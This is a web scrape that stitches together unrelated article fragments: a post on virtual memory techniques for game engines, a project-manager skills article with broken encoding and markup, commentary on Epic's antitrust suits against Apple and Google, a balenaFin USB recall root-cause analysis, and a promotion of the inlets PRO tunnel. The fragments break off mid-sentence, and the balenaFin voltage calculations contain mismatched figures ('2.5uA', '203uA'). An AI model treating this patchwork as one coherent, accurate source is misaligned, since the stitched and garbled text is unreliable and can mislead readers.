<p>Another note: Windows separates virtual memory allocation into separate <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">MEM_RESERVE</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">MEM_COMMIT</a> calls. <em>MEM_RESERVE</em> reserves address space and <em>MEM_COMMIT</em> commits it to physical memory. That does <em>not</em> mean that physical memory is actually allocated when you <em>MEM_COMMIT</em>, the physical memory is still not allocated until you actually touch the pages. But <em>MEM_COMMIT</em> reserves memory in the page file, and if you try to commit more memory than you have in your page file, <em>MEM_COMMIT</em> will fail. So on Windows, you probably don’t want to <em>MEM_COMMIT</em> the entire lookup table (because you only have a limited size page file). Instead you want to <em>MEM_RESERVE</em> the whole table in the beginning and then just <em>MEM_COMMIT</em> the range of the table that you actually use.</p>

<p>In contrast, Linux allows <em>overcommitting</em> — i.e., you can commit more memory than the size of your page file. For this reason, Linux doesn’t need separate reserve/commit operations which makes the virtual memory a lot simpler to use.</p>

<p>Is reserving 8 GB of virtual memory for the array a problem? Not really. There are two limits that concern us here. The first is <em>address space</em>. In a 64-bit application (which we assume), the address space is 2<sup>64</sup>, a staggeringly large number with room for billions of gigabyte-sized arrays. The second limit is for virtual memory. The OS typically doesn’t let us allocate the whole possible address space as virtual memory. On 64-bit Windows, for example, we can only allocate 256 TB of virtual memory. Still, that’s room for 32 000 arrays of 8 GB each, so as long as we don’t go totally crazy, we’re fine.</p>

<p>In fact, you could probably use this technique for <em>all</em> global or semi-global arrays in your application without any problems.</p>

<p>Remember the old-school C way of writing games with static arrays for all objects:</p>

<pre><code>uint32_t num_tanks;
tank_t tanks[MAX_TANKS];

uint32_t num_bullets;
bullet_t bullets[MAX_BULLETS];

...
</code></pre>

<p>If you write code like this, you can be sure that someone will complain that it’s not “future-proof”, since you have caps on the number of objects. That is kind of ridiculous, but to satisfy the complaint in a simpler and more fun way than using a <code>std::vector</code>  you can just get rid of the <code>MAX_*</code> defines and allocate 1 GB of virtual memory for each array:</p>

<pre><code>#define GB 1000000000
uint32_t num_tanks;
tank_t *tanks = virtual_alloc(GB);
uint32_t num_bullets;
bullet_t *bullets = virtual_alloc(GB);
</code></pre>

<h2 id="application-wide-unique-ids">Application wide unique IDs</h2>

<p>A lot of game engine systems need unique IDs to identify objects. Usually the code looks something like this:</p>

<pre><code>uint64_t allocate_id(system_t *sys)
{
    return sys-&gt;next_free_id++;
} 
</code></pre>

<p>But virtual memory gives us another option. Instead of using integers as identifiers, we could use addresses reserved from the virtual memory system. This allows us to create IDs that are unique, not just in the current system, but throughout the entire application. And since we never actually use the memory pointed to by these addresses, we won’t consume any physical memory.</p>

<p>It might look something like this:</p>

<pre><code>system_id_t *allocate_id(system_t *sys)
{
    if (!sys-&gt;id_block || sys-&gt;id_block_used == PAGE_SIZE) {
        sys-&gt;id_block = virtual_alloc(PAGE_SIZE);
        sys-&gt;id_block_used = 0;
    }
    return (system_id_t *)(sys-&gt;id_block + sys-&gt;id_block_used++);
}
</code></pre>

<p>Note that by using a pointer to an opaque struct for the ID we also get some type safety, that we didn’t have with the <code>uint64_t</code> approach.</p>

<h2 id="memory-overwrite-detection">Memory overwrite detection</h2>

<p>One of the hardest bugs to fix is random memory overwrites, where some piece of code is writing to memory that it shouldn’t touch. Then, later, when some other piece of code tries to use that memory, it will read that trash data and (most likely) crash. The problem here is that while the crash itself is easy to find, it is tricky to know where the bad write that corrupted the data to begin with occurred.</p>

<p>Luckily, virtual memory can help us here too.</p>

<p>To see why, first note that the term <em>random memory overwrite</em> is actually a misnomer. Just like regular space, address space is mostly empty. With a 64 bit address space and an application size of say 2 GB, the address space is 99.999999988 % empty. This means that if the memory overwrites were truly random, most likely they would hit this empty space and cause a <em>page fault/access violation</em>. That would give us a crash at the point of the bad write, instead of the innocent read, which would make the bug much easier to find and fix.</p>

<p>But of course, the writes are usually not truly random. Instead they typically fall in one of two categories:</p>

<ul>
<li>Writing to memory that has been freed.</li>
<li>Writing beyond the allocated memory for an object.</li>
</ul>

<p>In both cases, it is pretty likely that the write will actually hit some other object, rather than empty space. In the first case, the memory will probably have been recycled for something else. In the second case, the write will probably hit a neighboring object, or allocation block headers.</p>

<p>We can make these cases look more like the random case by replacing the standard system allocator with an end-of-page allocator. Such an allocator uses the virtual memory system to allocate each object on its own set of pages, and furthermore, it aligns the object so that the end of the object coincides with the end of the last page.</p>


<figure>
    
        <img src="https://ourmachinery.com/images/end-of-page.png">
    
    
    <figcaption>
        <h4>End of page block placement.</h4>
        
    </figcaption>
    
</figure>


<p>This accomplishes two things. First, when we free the pages, we free them in the virtual memory system. This means that attempting to write to the pages after they have been freed will result in an access violation. Note that this typically doesn’t happen with a regular memory allocator — it will save the freed memory in its freelists to be used for other allocations, instead of returning it to the OS.</p>

<p>Second, as the end of the block coincides with the end of the page, writing beyond the end of the block will also cause an access violation. In other words, with this approach, our typical bad memory writes will crash at the point of the write and allow us to easily diagnose the problem.</p>

<p>Since this allocator rounds up all allocations to the page size, it will waste a lot of memory for small allocations. It is probably not something that you want enabled all the time. What I typically do is work with the standard allocator. Then, if I suspect bad memory overwrites, I switch it out for the end-of-page allocator. Once I’ve fixed the problem, I switch back to the standard allocator. This of course requires you to have an architecture where you can easily change which allocator your system is using.</p>

<p>Writing an end end-of-page allocator is not complicated at all. Here’s what <code>malloc</code> looks like:</p>

<pre><code>void *eop_malloc(uint64_t size)
{
    uint64_t pages = (size + PAGE_SIZE - 1) / PAGE_SIZE;
    char *base = virtual_alloc(pages * PAGE_SIZE);
    uint64_t offset = pages * PAGE_SIZE - size;
    return base + offset;
}
</code></pre>

<p>Note: There’s still bad writes that could go undetected with this approach. For example, after we’ve freed the pages, a new page allocation could happen in the same memory range. Also, it is possible that another set of pages could be allocated directly after ours in memory, in which case we wouldn’t detect overwrites beyond the last page.</p>

<p>Both these problems can be fixed. For the first issue, we can leave the pages reserved, but not committed. That way, the physical memory is freed and we will get page faults, but the addresses are reserved and cannot be used by other objects. For the second issue, we could reserve an extra page after our pages, but not commit that page. No other object could then claim those addresses and writing to them would still …</p></section></article></div></div>

Sometimes you, as a project manager, feel like they are responsible for everything. Since your performance directly affects the success rate of the entire project. Project managers not only manage tasks but, most importantly, thoroughly guide the team toward the project goals. Being a great project manager requires interdisciplinary approaches and the ability to master both hard and soft skills. Letâ€™s have a closer look at three essential competencies for the project manager to be successful.</p><figure><div><div><div><p><img alt="Successful Project Manager Skills.

Therefore, itâ€™s necessary to acquire skills that will help you to extract all the relevant information from the stack of data and then use it to create trends that are going to help you to answer important questions concerning business activity.</li><li id="14dc"><strong><em>System Analysis.</em> </strong>In many small firms, which cannot afford to get separate specialists both for system analysis and project management, these positions are being filled by one person. So, there is a common ground between these jobs because they require the same set of skills from a person, such as excellent verbal communication, strategic thinking, and organizational skills.</li></ul><ul><li id="9b5a"><strong><em>Communicate with technical specialists.</em></strong> If you have any queries, do not hesitate to ask questions. Most of the developers that I worked with are very passionate about their job, so they will be more than happy to explain some concepts and IT specifics.</li><li id="f35f"><strong><em>Gather relevant technical information from similar projects.</em></strong> Learn the background and specifics of feature development from other products.</li><li id="eaca"><strong><em>Be curious about development processes.</em></strong> Be interested in all the technical processes and keep continually improving them. I would also suggest focusing on the QA process. Try to understand it thoroughly, everything from the process itself to the tools which can help.

Itâ€™s all about your aspiration to learn and the ability to communicate with the team effectively. You may start getting the technical skills with a couple of basic coding courses and continue developing them by reading the articles daily. If you have some humble technical experience, you can use your knowledge to back up the team by performing simple and mundane tasks. In turn, it will contribute to the smoother project delivery, improved development processes, and will help you in monitoring metrics.</p><figure><div><div><div><p><img alt="Project manager technical skills" src="https://miro.medium.com/max/2564/0*YkvqcH9oq08w0M-T" width="1282" height="869" srcset="https://miro.medium.com/max/552/0*YkvqcH9oq08w0M-T 276w, https://miro.medium.com/max/1104/0*YkvqcH9oq08w0M-T 552w, https://miro.medium.com/max/1280/0*YkvqcH9oq08w0M-T 640w, https://miro.medium.com/max/1400/0*YkvqcH9oq08w0M-T 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YkvqcH9oq08w0M-T?q=20"></p></div></div></div></figure><p id="3ec5">Business skills imply the ability to analyze the market, organization, customer behavior, and then use this knowledge to provide the best business results. It includes in itself a lot of things from being able to conduct proper market research, business planning to communication with your stakeholders. Every project manager deals with these tasks daily, starting from the planning stage, where you evaluate the feasibility of a feature and the value it will bring to an end customer to understand the long-term goals of a business to which you will align its further strategy. It is not something exceptionally hard, just as with any other skill to develop it, you need to be curious, use your critical thinking and practice.</p><figure><div><div><div><p><img alt="Project manager buisness skills" src="https://miro.medium.com/max/2250/0*NnWxT1UxmZtmsVTL" width="1125" height="737" srcset="https://miro.medium.com/max/552/0*NnWxT1UxmZtmsVTL 276w, https://miro.medium.com/max/1104/0*NnWxT1UxmZtmsVTL 552w, https://miro.medium.com/max/1280/0*NnWxT1UxmZtmsVTL 640w, https://miro.medium.com/max/1400/0*NnWxT1UxmZtmsVTL 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*NnWxT1UxmZtmsVTL?q=20"></p></div></div></div></figure><ul><li id="4639"><strong><em>Strategic planning.</em> </strong>A strategic plan defines the projectâ€™s goals, visions, and missions. Thus helping employees stay on track and increase their overall engagement and productivity. As a project manager, you need to understand that the long-term perspectives of the product are essential for aligning and scheduling present work to them and managing risks.</li><li id="3ae2"><strong><em>Decision-making skills.</em> </strong>At the beginning of their career, project managers can hesitate in the moments when they are required to make decisions that might affect the team members and future projectâ€™s life cycle. Therefore, it is essential to build confidence and determination and evaluate a variety of options to bring the best outcome for the business. This will eventually come with experience, but remember that making mistakes is okay, asking for help is okay, but being feckless and not taking responsibility for your actions is not okay.</li><li id="fe3c"><strong><em>Negotiation skills.</em> </strong>A project manager is that person in a project who negotiates with all different stakeholders daily to bring the best possible result for a business. You have to negotiate agreements with the stakeholders and team members and customers when you ask for more resources, bidding prices, convincing executive bodies for extensions, and so on. But most importantly, you need negotiation skills to match the needs of all the stakeholders to a mutual goal for clear work prioritization.</li></ul><figure><div><div><div><p><img alt="Project manager business skills" src="https://miro.medium.com/max/2080/0*hSaMgiZTX_QV9wu9" width="1040" height="767" srcset="https://miro.medium.com/max/552/0*hSaMgiZTX_QV9wu9 276w, https://miro.medium.com/max/1104/0*hSaMgiZTX_QV9wu9 552w, https://miro.medium.com/max/1280/0*hSaMgiZTX_QV9wu9 640w, https://miro.medium.com/max/1400/0*hSaMgiZTX_QV9wu9 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*hSaMgiZTX_QV9wu9?q=20"></p></div></div></div></figure><ul><li id="97c7"><strong><em>Explore more business cases.</em></strong> Research as many competitorsâ€™ products as you can, analyze why they were successful or not both from the technical and marketing side. This will enhance your knowledge and thus provide you with more options when making decisions.</li><li id="2cd0"><strong><em>Pay attention to clientsâ€™ needs.</em></strong> As a project manager, you should always check on the end-users of the product. It means identifying their problems and needs and solving them. You can do this by stating hypotheses, testing them, analyzing the results over and over again.</li><li id="9de1"><strong><em>Be informed.</em></strong> Pay attention to updates on similar products. Research what worked and did not from the marketing and business side. Take notes and draw lessons from their experience to use this knowledge while developing your product.</li></ul><p id="0e19">The main objective of applying your business skills lies in developing a perfectly functioning product that will generate higher revenue for the client or optimize current expenses. Letâ€™s consider a case: your team is working on a startup project. For startups, especially in the early stages, one of the most common ways to prove they can get this project on the next funding round. Though startup founders focus more on a discussion of features during meetups with technical teams, itâ€™s essential for you, as a project manager, to dig deeper and evaluate the criteria for entering the next seeding round (user base, monetization, etc.) are. Then further ensure the achievement of this goal. Understanding the project objectives and deliverables will give you flexibility in decision-making and adjusting the plan to change. You develop the product, not for features, but to bring value to the client and end-users.</p><p id="c6a3">Leadership is a set of strategies that help managers deal with problems, achieve positive results, and adapt to the changing environment. On top of being a great strategist, who has an extensive knowledge in both technical and business-related spheres you need to have that inner charm and energetic personality that will inspire and drive the team to do bigger and better things. A project manager is not only someone who follows processes, creates tasks in Jira, or communicates with a client. A project manager is a person who can predict possible risks well in advance, eliminates them, and maximizes the teamâ€™s results. Every manager adopts their style of leadership; it can be more autocratic or democratic. Your choice should depend on your employeesâ€™ personalities because some require more guidance, while others feel suffocated by rules. So, you have to be good at reading peopleâ€™s characters, which will help match your style to their needs and create an environment where their skills and talents can thrive.</p><figure><div><div><div><p><img alt="Project manager leadership skills" src="https://miro.medium.com/max/2802/0*VkmK4Vr1E3__MonT" width="1401" height="872" srcset="https://miro.medium.com/max/552/0*VkmK4Vr1E3__MonT 276w, https://miro.medium.com/max/1104/0*VkmK4Vr1E3__MonT 552w, https://miro.medium.com/max/1280/0*VkmK4Vr1E3__MonT 640w, https://miro.medium.com/max/1400/0*VkmK4Vr1E3__MonT 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*VkmK4Vr1E3__MonT?q=20"></p></div></div></div></figure><ul><li id="30a4"><strong><em>Communication skill.</em> </strong>Communication is key to becoming a great leader, whether it concerns delivering business goals to team members or having a one-on-one conversation.

<p>Epic Games introduced an update to their mobile (iOS and Android) version of Fortnite that allows users to buy directly from Epic Games at a 20% discount, removing incentives to pay with the officially sanctioned payment systems on the App Store and Play Store.&nbsp;</p>



<p>Soon after this update, Apple removed Fortnite from its App Store, Google was not far behind in doing the same. In response, Epic Games has filed individual suits against both tech giants claiming that their behaviour is monopolistic control over their respective ecosystems. However, there is some nuance and differences that we should explore between the two ecosystems that could have implications for the validity of the anti-trust lawsuits that Epic will have to contend with.&nbsp;</p>



<p>Looking at the two ecosystems holistically, it is perhaps more appropriate in this case to think of Android and iOS as marketplaces rather than solely focusing on their function as operating systems. The contention is that the marketplaces are being monopolised and controlled to the disadvantage of developers. This is especially true of Apple iOS, where the entire OS is a marketplace, where the App Store is the only access point for third-party applications to the ecosystem. If an application is removed from the App Store, the third-party application simply cannot exist on the iOS ecosystem.&nbsp;</p>



<p>Comparatively, Google’s Android OS functions a little differently. The OS acts as an open ecosystem which is augmented by the Play Store. The Play Store, not the OS, is the marketplace – the place for discovery. The Play Store as a standalone application can have comparative and competitive marketplaces on the Android OS, like the Samsung store. Further, the Android OS allows for third-party installs of applications albeit with security warnings.&nbsp;</p>



<p>Epic might have a hard time arguing that Google is being anti-competitive when it has avenues of access – albeit less direct – outside of the Google Play Store. Applications can still exist within the Android ecosystem even when the Play Store removes listings according to their marketplace rules.</p>



<p>Apple, on the other hand, has its entire ecosystem siloed as a marketplace, with no third-party marketplaces allowed and no ability to legally install third-party applications – placing them in a much more difficult position when it comes to anti-competitive claims. In recent months, Apple has come under increasing scrutiny as they butt heads with application developers, most notably Hey email client, Google’s Stadia platform and Microsoft’s xCloud platform.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <p>Earlier today, we announced our decision to recall all v1.1 balenaFins due to a USB malfunction at high temperatures. If you think your balenaFin might be affected, please follow the instructions outlined <a href="https://store.balena.io/pages/product-recall-announcement">here</a>.</p>

<p>This issue prevents affected balenaFins from accessing any USB peripherals when the ambient temperature rises above 45-50°C (113-132°F). It also means that those devices relying on ethernet connectivity are disconnected at these higher temperatures since the ethernet bridge is also USB-based.</p>

<p>Based on our estimates, around 90% of all deployed balenaFins are likely affected by this issue. We are fully aware that a recall negatively impacts our customers and introduces friction in their fleet operations, which we, as a company, strive to reduce. <br>
Ultimately, it is our responsibility to take this as a learning opportunity to improve our processes. We now have a more robust testing procedure for both our design and manufacturing processes. The performance of every connectivity protocol at low and high operational temperatures is now part of our standard suite of tests.</p>

<p>This blogpost aims to offer an in-depth technical explanation of the underlying issue and the steps we are taking to prevent this from happening again.</p>

<h3 id="balenafinusbtopology">balenaFin USB topology</h3>

<p><img src="https://www.balena.io/blog/content/images/2020/08/USB-topology-diagram.png" alt="" title="">  </p>

<p>Key components of the balenaFin's USB topology are presented in figure 1. The two main blocks are the USB hub and switch, which allows for regular USB operation and internal eMMC flashing.</p>

<p>The USB hub is based on the LAN9514i chipset (LAN9514 on the v1.0 revision), which has an integrated USB to Ethernet bridge (PHY included). This structure has the benefit of a considerably smaller footprint, but it also means that if the hub is disconnected, so will the Ethernet connection.</p>

<p>The USB switch works by sensing power (VBUS) on the micro-USB connector. When a powered device is detected, the USB interface on the compute module is wired directly to the micro-USB connector. When no powered device is detected, the compute module is connected to the USB hub. The former situation only occurs when the balenaFin is connected to a host device (PC or laptop) to flash the internal eMMC memory.</p>

<h3 id="reportedissues">Reported issues</h3>

<p>The first report of a potential operating temperature issue was posted in our forums in June 2019:</p>

<ul>
<li><a href="https://forums.balena.io/t/questions-around-thermal-restarts-on-the-fin/17330">https://forums.balena.io/t/questions-around-thermal-restarts-on-the-fin/17330</a></li>
</ul>

<p>We concluded that the USB power protections were being triggered by the heat generated from a combination of high current draw and CPU load. This theory seemed to be confirmed by the fact that placing a heatsink on top of the USB protection chips made the issue disappear. </p>

<p>In retrospect, we missed that the addition of vents also reduced the ambient temperature inside the case, hinting that something else might have been going on. </p>

<p>Approximately a year later, another balenaFin customer contacted us via our balenaCloud support chat to report a similar issue. The following situation was also reported in our forums around that time:</p>

<ul>
<li><a href="https://forums.balena.io/t/thermal-operating-range-of-balenafin/150982">https://forums.balena.io/t/thermal-operating-range-of-balenafin/150982</a></li>
</ul>

<p>With the help of a customer who performed an extensive early investigation, we extracted two previously unknown facts:</p>

<ul>
<li>The Ethernet interface was being disconnected along with the plugged USB devices.</li>
<li>balenaFin revision (v1.0) did not appear to be affected.</li>
</ul>

<p>With this new information, we decided to launch a full investigation to test the v1.1 balenaFin's performance at higher temperatures. <br>
While the v1.0 balenaFin was fully tested under high temperatures, the v1.1 balenaFin was only subject to a limited test suite (cold-boot and power-cycle). There were two main reasons for that:</p>

<ul>
<li>Since the LAN9514i hub is individually tested for performance at high temperatures by the manufacturer, we decided to skip this test.</li>
<li>The only other change related to the USB circuitry was the ability to power from the micro-USB port. This is only used when flashing the balenaFin memory, and not intended to be done at high temperatures.</li>
</ul>

<h3 id="investigation">Investigation</h3>

<p>We performed a series of tests in a temperature-controlled chamber that was set to reach an ambient temperature of 80°C, heating at a rate of 1°C/minute. Once the maximum temperature was reached, the devices were left idle for a minimum of 30 minutes before performing any further operations.</p>

<p><img src="https://www.balena.io/blog/content/images/2020/08/WhatsApp-Image-2020-08-13-at-10-53-29-PM-1.jpeg" alt=""></p>

<h6 id="july6th">July 6th</h6>

<p><strong>Test #1:</strong>  </p>

<ul>
<li>Device: Standard v1.0 balenaFin.  </li>
<li>Result: No issues were found on the USB subsystem and no functional degradation was observed. </li>
</ul>

<p><strong>Test #2:</strong>  </p>

<ul>
<li>Device: Standard v1.1 Fin. </li>
<li>Result: At 48C ambient temperature, the USB peripherals connected were suddenly shut down. Ethernet connectivity was also lost.  </li>
<li>Observations: Kernel logs reported that the USB hub was disconnected and no longer accessible.  </li>
</ul>

<p>Note: the above tests were repeated in every session with the exact same results.</p>

<p><strong>Test #3:</strong>   </p>

<ul>
<li>Device: Modified v1.1 balenaFin with the USB power controllers removed.  </li>
<li>Results: We experienced the same issues as the unmodified v1.1 balenaFin.  </li>
<li>Observations: This test's objective was to review our original hypothesis that the USB power controllers are the root cause of the issue. The result disproved our initial hypothesis. </li>
</ul>

<h6 id="july10th">July 10th</h6>

<p><strong>Test #1:</strong>  </p>

<ul>
<li>Device: Modified v1.1 balenaFin with the following changes: <br>
<ul><li>The USB header pins were removed, as this was a significant design change between revisions v1.0 and v1.1 and therefore stood out as a potential culprit  </li>
<li>Wire soldered to the 5V USB bus and connected to an oscilloscope.  </li>
<li>Wire soldered to the 3.3V rail and hooked to an oscilloscope.  </li></ul></li>
<li>Result: Same as unmodified v1.1 balenaFin.  </li>
<li>Observations: On the oscilloscope, we noticed some noise on the 3.3V rail right when the USB hub was shutting down. This noise suggested a potential issue between the power converters and the USB hub. After the device was power cycled at a constant temperature of 60C, the same glitches were observed every 2-3 seconds.</li>
</ul>

<p><strong>Test #2:</strong> </p>

<ul>
<li>Device: The balenaFin from test #1 was modified to cut power to the USB hub by desoldering L20. </li>
<li>Result: Power glitches were not observed. The USB hub was not powered so it remained disconnected throughout the entire test.</li>
<li>Observations: Results seemed to point to a power delivery issue at high temperatures. For further testing, we requested our contract manufacturer to produce a v1.1 balenaFin with a LAN9514 (instead of a LAN9514i) to rule out the potential of the issue being caused by a  faulty batch of USB hubs. Since the power delivery circuitry stayed mostly unchanged between revisions v1.0 and v1.1, it would also help us single out any power distribution faults. </li>
</ul>

<h6 id="july15th">July 15th</h6>

<p>During the previous testing sessions, we were able to consistently reproduce the issue at 45-50°C, allowing us to run tests locally without a professional heat chamber. </p>

<p>We proceeded to test an off-the-shelf v1.1 balenaFin with the LAN9514i replaced by a LAN9514. The results were mainly the same as previous tests, where the USB hub shut down at ~50°C, and the same noise was present in the power rails. <br>
To rule out power delivery being the root cause, we decided to power the USB hub from a separate bench power supply unit placed away from the heat source. Issues persisted with this setup, pointing us away from a power delivery problem.</p>

<p>During these last few tests, we realized that the hub would remain off if it did not receive any signal from the compute module, regardless if it was powered or not. The latter suggested that the issue might not be the hub powering off, but instead not receiving any input from the CM. </p>

<h3 id="rootcauseanalysis">Root cause analysis</h3>

<p>The issue was introduced by a seemingly unrelated change in revision v1.1 that allowed the balenaFin to be powered from the micro-USB port.</p>

<p><img src="https://www.balena.io/blog/content/images/2020/08/Power-schematics.png" alt=""></p>

<p>We used Schottky diodes to prevent back current being injected into a power supply in the accidental case where more than one power supply was connected.  </p>

<p>This type of diodes is widely used in power applications due to their relatively high forward current and low voltage drop. On the flip side, they typically have high reverse leakage current, which increases by an order of magnitude for every 25°C increase.  </p>

<p>Reverse current is hardly ever an issue when sunk by power supplies, even at high temperatures, but in our case, it was causing another undesirable side effect. As shown in figure 3, the USB switch senses the voltage on the micro-USB bus (5V_USB_DBG), and it is triggered when the transistor's gate voltage (Vg) reaches the transistor’s <code>on</code> level (typically 0.8V).  </p>

<p><img src="https://www.balena.io/blog/content/images/2020/08/USB-Switch-schematics.png" alt=""></p>

<p>For the sake of simplicity, the transistor gate current (Ig) can be considered zero, as its value is orders of magnitude lower than the reverse leakage current (Irl). At room temperature (25°C) the value of Irl is around 2uA, making the gate voltage:</p>

<p><code>Vg = Irl * R = 2.5uA * 47kOhm = 117.5mV</code></p>

<p>At 50°C, Irl becomes 20uA, so:</p>

<p><code>Vg = Irl * R = 203uA * 47kOhm = 940mV</code></p>

<p>At this temperature level, the gate voltage becomes high enough to turn the transistor on, tying the switch pin to ground and consequently disconnecting the USB hub from the compute module. </p>

<h3 id="fix">Fix</h3>

<p>The most straightforward way to reduce the impact of the leakage current in the circuit is to reduce the value of R116 (see image 3). Such value should be low enough such that  Vg never reaches 0.6V (which is the minimum 'on' voltage according to the transistor datasheet). <br>
There is a small downside to this approach; it will consume more power when the USB switch is on. Such a situation only happens when the balenaFin is put in mass storage device mode to flash the eMMC (powered by the micro-USB connector). In this case, the vast majority of the peripherals are off, minimizing the downside of a slightly larger current, so we decided this was an acceptable tradeoff. </p>

<p>We selected a value of 1kOhm, which makes the gate voltage:</p>

<p><code>Vg = Irl * R = 2uA *1kOhm = 2mV @ 25°C</code> <br>
<code>Vg = Irl * R = 20uA *1kOhm = 20mV @ 50°C</code> <br>
<code>Vg = Irl * R = 200uA *1kOhm = 200mV @ 75°C</code></p>

        <section>
            <div><p>inlets PRO is a secure, commercial TCP tunnel, built for connecting services in a Cloud Native way. Learn what it can do for you, and how it was built from OSS roots. At the end of the post, you'll be able to view the new landing page with both personal and commercial pricing, along with comparisons to other networking solutions.</p>
<p><img src="https://inlets.dev/images/inlets-pro-purple.png" width="50%" alt="inlets PRO"></p><h2 id="whatisinlets">What is inlets?</h2>
<p><a href="https://github.com/inlets/inlets">inlets</a> is an open-source network tunnel project that I built out in late 2018/2019. After a long history of working for enterprise companies, and facing troubling network conditions on the road (captive portals), and restrictive firewalls, I sat down to write some code and try and solve the problem.</p>
<p>To start with, the code (written in Go) was rudimentary, and serialised raw HTTP request and response objects over the wire. I'd decided to pick websockets for the transport, because I knew that a websocket could penetrate almost any network conditions by initiating an outbound call from a client to a well-known port on a HTTP server - 80 or 443.</p>
<p><img src="https://github.com/inlets/inlets/raw/master/docs/inlets.png" alt="inlets OSS architecture"></p>
<p>After the project gained traction, the proof of concept had served its purpose and I rewrote the code to use off the shelf libraries like <a href="https://github.com/gorilla/websocket">Gorilla's websocket library</a>.</p>
<p>Simply put, if you had a HTTP service on your laptop, Raspberry Pi, VM, Docker image, Windows PC, Mac, or Kubernetes cluster, using inlets you could expose it on another network, and that network was usually the Internet.</p>
<p>inlets 1.0 and 2.0 were released and <a href="https://github.com/inlets/inlets/blob/master/docs/community.md">attracted many comments on Hacker News and the project acquired is own community</a> of personal and commercial users. As of today, it has 6.5k GitHub stars and can be used via a Docker image or a static binary.</p>

<p>Despite running in conditions where tools like Ngrok were completely banned, or non-functional, the barrier to entry was still too high for some users. They were used to simply running a single command and connecting to a SaaS tunnel.</p>
<p>SaaS tunnels are notoriously difficult to access from corporate networks, and are hamstringed by silly limits like being active for only 7 hours, or limiting connections per minute, even to those who pay for the service.</p>
<p>The route I took for this was to create <a href="https://github.com/inlets/inletsctl">inletsctl</a> - a tool that could bootstrap a tunnel server or (exit-server) within a few moments on your favourite cloud.</p>
<p>inletsctl has a <a href="https://github.com/inlets/inletsctl/tree/master/pkg/provision">provision package</a> which can set up new hosts on DigitalOcean, Packet, Civo, Scaleway, AWS EC2, GCE, Azure, Linode, and Hetzner. There are five different contributors to this code, and you can think of it a little bit like a basic version of Terraform.</p>
<p>Here's how it works:</p>
<pre><code>inletsctl create --provider digitalocean \
 --region lon1 \
 --access-token-file ~/do-access-token
</code></pre>
<p>Then after a few moments, you'll get a "connection string" for your server.</p>
<pre><code>Using provider: digitalocean
Requesting host: relaxed-brahmagupta1 in lon1, from digitalocean
2020/08/13 10:02:19 Provisioning host with DigitalOcean
Host: 203721867, status:

  Auth-token: sO7tIBsy7FaVXb0HiVKXejsBvt6GEUGiSHbcMlrEo6d928cUIIjgPj7nJxnwFvM6

Command:
  export UPSTREAM=http://127.0.0.1:8000
  inlets client --remote "ws://206.189.124.232:8080" \
	--token "sO7tIBsy7FaVXb0HiVKXejsBvt6GEUGiSHbcMlrEo6d928cUIIjgPj7nJxnwFvM6" \
	--upstream $UPSTREAM

To Delete:
	inletsctl delete --provider digitalocean --id "203721867"
</code></pre>
<p>How much does it cost? As little as possible, around 5 USD / mo, and you can of course, run more than one tunnel server there if you wish.</p>
<h2 id="inletsintegratesdirectlywithkubernetes">inlets integrates directly with Kubernetes</h2>
<p>One of the other common complaints of the incumbant SaaS tunnels are that they do not integrate natively with Kubernetes, and when they do, they are still subjected to the same limits that we talked about above.</p>
<p>Enter the <a href="https://github.com/inlets/inlets-operator">inlets-operator</a> - the tagline is "Get Kubernetes LoadBalancers from within your private network."</p>
<p>It works by detecting any Service in your cluster of type "LoadBalancer" and then it acts just like inletsctl, setting up an exit-server on your favourite cloud. However, this time, rather than you running "inlets client" from your command-line, a Pod is deployed into the cluster, which connects a private service in your cluster to the new server with a public IP.</p>
<p>This works extremely well, and is much faster than getting an ALB for instance on Amazon's managed Kubernetes product, EKS.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-vip-k8s.png" alt="LE working behind inlets PRO"></p>
<p>See the tutorial: <a href="https://docs.inlets.dev/#/get-started/quickstart-ingresscontroller-cert-manager?id=expose-your-ingresscontroller-and-get-tls-from-letsencrypt">Expose Your IngressController and get TLS from LetsEncrypt</a></p>
<p>You can even bring your own IngressController along, since inlets PRO works at the TCP-level.</p>

<blockquote>
<p>Walk-through: Get LetsEncrypt certificates and public IPs for your private IngressController</p>
</blockquote>
<h2 id="likeapro">Like a PRO</h2>
<p>Shortly after introducing inlets, inletsctl, and the inlets-operator, I developed a need for more than just a HTTP tunnel and started planning and thinking how to go about this. I also wanted to make sure that the websocket itself had TLS configured automatically, with the OSS version of inlets, <a href="https://blog.alexellis.io/https-inlets-local-endpoints">it was up to the operator to add it with a reverse proxy</a>.</p>
<p>I wanted to deploy <a href="https://github.com/jetstack/cert-manager">cert-manager</a>, ingress-nginx and then to get TLS certificates from <a href="https://letsencrypt.org/">LetsEncrypt</a>, just like I would do on a public cluster. This didn't work, since the OSS version of inlets terminated TLS on the exit-server. I needed a tunnel that could pass-through TCP traffic.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-vip.png" alt="VIP"></p>
<p>I did something a little different with inlets PRO. I didn't open-source it, I worked in private, tested with a couple of trusted friends from the community, and then released only a binary.</p>
<p>The binary requires a JWT license code to work, and so I set up a "start a trial page" and sat back.</p>
<blockquote>
<p>As the founder of other open-source projects like <a href="https://www.openfaas.com/">OpenFaaS</a>, I was used to the following conversation with companies: "We will use your stuff for our production applications, and ask you for help for free, and no we won't sponsor, contribute to the project, or hire you for support."</p>
<p>With inlets PRO, the conversation changed. "We think we need your thing, we're almost certain of that. How much does it cost? A proof of concept, that sounds great, what will that cost?"</p>
</blockquote>
<p>As I mentioned on the <a href="https://kubernetespodcast.com/episode/116-independent-open-source/">Google Kubernetes Podcast this week</a>, companies don't pay for free. It's only when a pricing-gate is put in place, that value can be captured for the maintainer or vendor of software.</p>
<p>There's been dozens of trials issued already, and several large corporations that have expressed an interest, but not for what I expected.</p>
<p>Here are a couple of examples of how inlets PRO can be used:</p>
<ul>
<li><a href="https://medium.com/@burtonr/local-database-for-the-cloud-with-inlets-pro-ac0488cc54e0">Save Money by Connecting Your Local Database to the Public Cloud</a> by Burton Rheutan</li>
